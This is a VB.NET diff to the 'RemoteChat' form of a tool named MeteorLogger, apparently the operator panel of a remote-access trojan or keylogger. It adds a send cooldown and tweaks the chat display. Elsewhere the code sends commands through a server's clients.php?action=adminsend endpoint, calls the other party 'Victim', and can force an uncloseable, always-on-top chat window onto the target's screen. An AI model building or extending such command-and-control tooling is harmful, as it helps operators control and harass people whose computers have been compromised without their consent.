@@ -8,6 +8,7 @@ Public Class RemoteChat
     Private chatFluxThread As New Threading.Thread(Sub() chatFluxManage())
     Dim messageList As New List(Of Tuple(Of String, Boolean)) ' Respectively : message and isAdmin
     Dim firstIter As Boolean = True
+    Dim sendMessageAllowed As Boolean = True
 
     Private Sub remotechat_Load(sender As Object, e As EventArgs) Handles MyBase.Load
         Me.Text = "Remote Chat @ " & targetIp
@@ -26,7 +27,6 @@ Public Class RemoteChat
 
     Private Sub RefreshChat()
         Try
-
             chatWindow.Clear()
 
             For Each message In messageList
@@ -43,7 +43,6 @@ Public Class RemoteChat
 
             If messageList.Count > 100 Then messageList.Clear()
             chatWindow.ScrollToCaret() : chatWindow.Refresh()
-
         Catch ex As AccessViolationException
             MsgBox("Memory exception occured. Click OK to reload the tchat panel-side.",
                 MsgBoxStyle.Exclamation, "MeteorLogger - Remote chat @" & targetIp)
@@ -57,11 +56,20 @@ Public Class RemoteChat
         Next
 
         chatWindow.Text &= "--- Victim has closed the chat window ---"
-        chatWindow.ScrollToCaret() : chatWindow.Refresh()
+        chatWindow.SelectionStart = chatWindow.Text.Length : chatWindow.ScrollToCaret() : chatWindow.Refresh()
         messageTB.Enabled = False
     End Sub
 
+    Private Sub StartCooldown(interval As Integer)
+        sendMessageAllowed = False
+        Threading.Thread.Sleep(interval)
+        Invoke(Sub() messageTB.Clear())
+        sendMessageAllowed = True
+    End Sub
+
     Private Sub SendButtonClickSub()
+        If messageTB.Text.Trim.Length = 0 Or Not sendMessageAllowed Then Exit Sub
+
         Dim showInTaskBar = "0", alwaysOnTop = "1", allowCloseChat = "0"
 
         If allowCloseChatCB.Checked Then allowCloseChat = "1"
@@ -69,21 +77,23 @@ Public Class RemoteChat
         If topMostCB.Checked Then alwaysOnTop = "1"
 
         Dim sendMessageQuery = New WebClient().DownloadString(My.Settings.vpsurl &
-                             "clients.php?action=adminsend&target=" & targetIp &
-                             "&actioncontent=" & showInTaskBar &
-                             "&actioncontent2=" & alwaysOnTop &
-                             "&actioncontent3=" & allowCloseChat &
-                             "&actioncontent4=" & Convert.ToBase64String(Encoding.UTF8.GetBytes(messageTB.Text)))
+                            "clients.php?action=adminsend&target=" & targetIp &
+                            "&actioncontent=" & showInTaskBar &
+                            "&actioncontent2=" & alwaysOnTop &
+                            "&actioncontent3=" & allowCloseChat &
+                            "&actioncontent4=" & Convert.ToBase64String(Encoding.UTF8.GetBytes(messageTB.Text)))
 
         messageList.Add(New Tuple(Of String, Boolean)(messageTB.Text, True))
         RefreshChat()
         messageTB.Clear()
 
+        Dim cooldownThread As New Threading.Thread(Sub() StartCooldown(1000))
+        cooldownThread.Start()
     End Sub
 
     Private Sub sendButton_Click(sender As Object, e As EventArgs) Handles sendButton.Click
         ' TODO : Make a cooldown
-        sendButtonClickSub()
+        SendButtonClickSub()
     End Sub
 
     Private Sub ChatFluxManage()
@@ -132,6 +142,23 @@ EndOfTreatement:
         If e.KeyCode = Keys.Enter Then
             e.SuppressKeyPress = True
             sendButtonClickSub()
+        End If
+    End Sub
+
+    Dim removeCooldownMsg As Boolean = False
+    Private Sub cooldownTimer_Tick(sender As Object, e As EventArgs) Handles cooldownTimer.Tick
+        If Not sendMessageAllowed Then
+            sendButton.Enabled = False
+            messageTB.ForeColor = Color.Gray
+            messageTB.Text = "Cooldown..."
+            messageTB.ReadOnly = True
+            removeCooldownMsg = True
+
+        ElseIf removeCooldownMsg Then
+            removeCooldownMsg = False
+            messageTB.ReadOnly = False
+            messageTB.ForeColor = Color.Black
+            sendButton.Enabled = True
         End If
     End Sub
 End Class
